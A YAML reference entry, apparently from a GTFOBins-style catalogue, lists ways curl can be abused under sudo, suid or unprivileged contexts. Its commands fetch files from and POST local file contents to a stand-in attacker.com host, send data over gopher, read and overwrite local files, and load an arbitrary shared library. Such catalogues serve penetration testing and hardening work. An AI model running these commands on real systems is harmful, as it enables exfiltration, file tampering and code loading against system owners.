---
functions:
  download:
  - code: |-
      curl http://attacker.com/path/to/input-file -o /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: http-server
  file-read:
  - code: |-
      curl file:///path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      echo DATA >/path/to/temp-file
      curl file:///path/to/temp-file -o /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
  library-load:
  - code: |-
      curl --engine /path/to/lib.so x
    contexts:
      sudo:
      suid:
      unprivileged:
  upload:
  - code: |-
      curl -X POST --data-binary @/path/to/input-file http://attacker.com
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: http-server
  - code: |-
      curl -X POST --data-binary DATA http://attacker.com
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: http-server
  - code: |-
      curl gopher://attacker.com:12345/_DATA
    comment: |-
      Data will be `\r\n` terminated.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tcp-server
...
